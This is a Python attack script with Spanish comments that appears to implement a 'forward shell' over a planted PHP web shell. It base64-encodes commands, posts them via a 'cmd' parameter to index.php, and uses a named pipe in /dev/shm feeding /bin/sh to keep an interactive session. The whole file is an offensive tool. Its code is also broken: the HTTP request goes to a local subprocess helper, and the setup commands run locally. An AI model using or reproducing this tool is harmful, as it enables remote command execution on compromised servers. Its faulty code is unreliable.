#!/usr/bin/python3

import requests
import subprocess
import time
import threading
import os
import signal
import sys
from base64 import b64encode
from random import randrange

class AllTheReads:
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        # Lee el contenido del archivo stdout
        read_output = f"/bin/cat {stdout}"
        # Limpia el contenido del archivo stdout
        clear_output = f"echo '' > {stdout}"
        while True:
            # Ejecuta el comando para leer el contenido de stdout
            output = run_cmd(read_output)
            if output:
                # Limpia stdout y muestra el resultado si hay contenido
                run_cmd(clear_output)
                print(output)
            time.sleep(self.interval)

# Función para ejecutar comandos en la shell
def run_cmd(cmd):
    try:
        # Ejecuta el comando y devuelve el resultado
        result = subprocess.check_output(cmd, shell=True, text=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        # Maneja errores al ejecutar comandos
        print(f"Error ejecutando el comando: {e}")
        return ""

# Función para escribir comandos en el servidor a través de una solicitud HTTP
def write_cmd(cmd):
    # Codifica el comando en base64 y construye el payload para la solicitud HTTP
    cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
    payload = {
        'cmd': f'echo "{cmd}" | base64 -d > {stdin}'
    }
    # Realiza la solicitud HTTP al servidor
    result = run_cmd('http://127.0.0.1/index.php', params=payload, timeout=5)
    return result.strip()

# Configura la shell para la comunicación
def setup_shell():
    # Crea named pipes (tubos con nombre) para la comunicación bidireccional
    named_pipes = f"mkfifo {stdin}; tail -f {stdin} | /bin/sh 2>&1 > {stdout}"
    run_cmd(named_pipes)

# Maneja la señal de interrupción (Ctrl+C)
def sig_handler(sig, frame):
    print("\n\n[*] Saliendo...\n")
    print("[*] Eliminando archivos...\n")
    try:
        # Elimina los archivos stdin y stdout
        os.remove(stdin)
        os.remove(stdout)
        print("[*] Todos los archivos han sido eliminados\n")
    except FileNotFoundError:
        # Maneja el caso en que los archivos no se encuentren
        print("[*] Archivos no encontrados\n")
    sys.exit(0)

if __name__ == "__main__":
    # Genera un número de sesión aleatorio
    session = randrange(1000, 9999)
    # Construye las rutas de los archivos stdin y stdout
    stdin = f"/dev/shm/input.{session}"
    stdout = f"/dev/shm/output.{session}"

    # Configura la shell para la comunicación
    setup_shell()

    # Inicia la lectura continua de stdout en un hilo separado
    ReadingTheThings = AllTheReads()

    # Configura el manejador de señales para Ctrl+C
    signal.signal(signal.SIGINT, sig_handler)

    while True:
        # Lee un comando desde la entrada estándar y lo envía al servidor
        cmd = input("> ")
        write_cmd(cmd + "\n")
